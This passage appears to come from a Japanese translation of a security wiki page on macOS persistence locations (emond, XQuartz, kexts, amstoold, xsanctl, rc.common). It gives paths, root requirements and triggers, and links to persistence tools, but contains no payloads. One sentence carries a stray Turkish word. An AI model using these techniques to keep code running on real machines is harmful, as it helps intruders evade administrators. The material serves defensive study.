Apple によって導入された **emond** は、開発が不十分、または廃止された可能性があるように見える logging mechanism ですが、現在もアクセス可能です。Mac administrator にとって特に有益ではないものの、この未知の service は threat actor にとって、macOS admins の大半に気付かれにくい subtle な persistence method として利用される可能性があります。<sup>[[34]](#references)</sup>

その存在を知っている人にとって、**emond** の悪意のある利用を特定するのは容易です。この service の system の LaunchDaemon は、単一の directory 内で実行する scripts を探します。これを確認するには、次の command を使用できます:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### Location

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- root 必須
- **Trigger**: XQuartz 使用時

#### Description & Exploit

XQuartz は **macOS に artıkインストールされていません**。詳細については writeup を確認してください。<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> kext のインストールは root であっても非常に複雑なため、exploit がない限り、実用的な sandbox-escape または persistence technique とは見なされません。

#### Location

KEXT を startup item としてインストールするには、**以下のいずれかの場所にインストールする必要があります**。

- `/System/Library/Extensions`
- OS X operating system に組み込まれた KEXT files
- `/Library/Extensions`
- 3rd party software によってインストールされた KEXT files

現在ロードされている kext files は、次のコマンドで一覧表示できます。
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
詳細については、[**kernel extensions check this section**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers)を確認してください。

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### 場所

- **`/usr/local/bin/amstoold`**
- Rootが必要

#### 説明とExploit

どうやら`/System/Library/LaunchAgents/com.apple.amstoold.plist`の`plist`は、このバイナリを使用しながらXPC serviceを公開していたようです……問題は、そのバイナリが存在しなかったことです。そのため、そこに何かを配置しておけば、XPC serviceが呼び出されたときにそのバイナリも呼び出されます。<sup>[[35]](#references)</sup>

現在のmacOSでは、もうこれを見つけることはできません。

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### 場所

- **`/Library/Preferences/Xsan/.xsanrc`**
- Rootが必要
- **Trigger**: serviceが実行されたとき（まれ）

#### 説明とexploit

このscriptが実行されることはあまり一般的ではないようです。また、私のmacOSでも見つけることができなかったため、詳細についてはWriteupを確認してください。<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **これは最新のMacOSバージョンでは動作しません**

ここには、**startup時に実行されるcommands**を配置することもできます。通常のrc.common scriptの例:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Persistence techniques and tools

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025年、Infostealerの年](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [昔ながらのLaunchAgentsを超えて - 1 - shell startup files](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [昔ながらのLaunchAgentsを超えて - 18 - X11 and XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [昔ながらのLaunchAgentsを超えて - 21 - Re-opened Applications](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [昔ながらのLaunchAgentsを超えて - 20 - Terminal Preferences](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [昔ながらのLaunchAgentsを超えて - 13 - Audio Plugins](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Audio Unit Plug-ins (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [昔ながらのLaunchAgentsを超えて - 12 - QuickLook Plugins](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [昔ながらのLaunchAgentsを超えて - 22 - LoginHook and LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [昔ながらのLaunchAgentsを超えて - 4 - cron jobs](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [昔ながらのLaunchAgentsを超えて - 2 - iTerm2 startup](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [昔ながらのLaunchAgentsを超えて - 7 - xbar plugins](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [昔ながらのLaunchAgentsを超えて - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [昔ながらのLaunchAgentsを超えて - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [昔ながらのLaunchAgentsを超えて - 3 - Login Items](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [昔ながらのLaunchAgentsを超えて - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [昔ながらのLaunchAgentsを超えて - 24 - Folder Actions](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [macOSでのPersistenceのためのFolder Actions (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [昔ながらのLaunchAgentsを超えて - 27 - Dock shortcuts](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [昔ながらのLaunchAgentsを超えて - 17 - Color Pickers](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [昔ながらのLaunchAgentsを超えて - 26 - Finder Sync Plugins](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [「Mac File Opener」のPersistenceの分析 (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [昔ながらのLaunchAgentsを超えて - 16 - Screen Saver](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Accessの維持: macOS PersistenceのためのScreensavers (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [昔ながらのLaunchAgentsを超えて - 11 - Spotlight Importers](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [昔ながらのLaunchAgentsを超えて - 9 - Preference Pane](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [昔ながらのLaunchAgentsを超えて - 19 - Periodic Scripts](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [昔ながらのLaunchAgentsを超えて - 5 - Pluggable Authentication Modules (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [昔ながらのLaunchAgentsを超えて - 28 - Authorization Plugins](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Authorization Pluginsによる永続的なCredential Theft (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [昔ながらのLaunchAgentsを超えて - 30 - man config file - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [昔ながらのLaunchAgentsを超えて - 25 - Apache2 modules](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [昔ながらのLaunchAgentsを超えて - 31 - BSM audit framework](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [昔ながらのLaunchAgentsを超えて - 23 - emond、The Event Monitor Daemon](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [昔ながらのLaunchAgentsを超えて - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [昔ながらのLaunchAgentsを超えて - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
{{#include ../banners/hacktricks-training.md}}
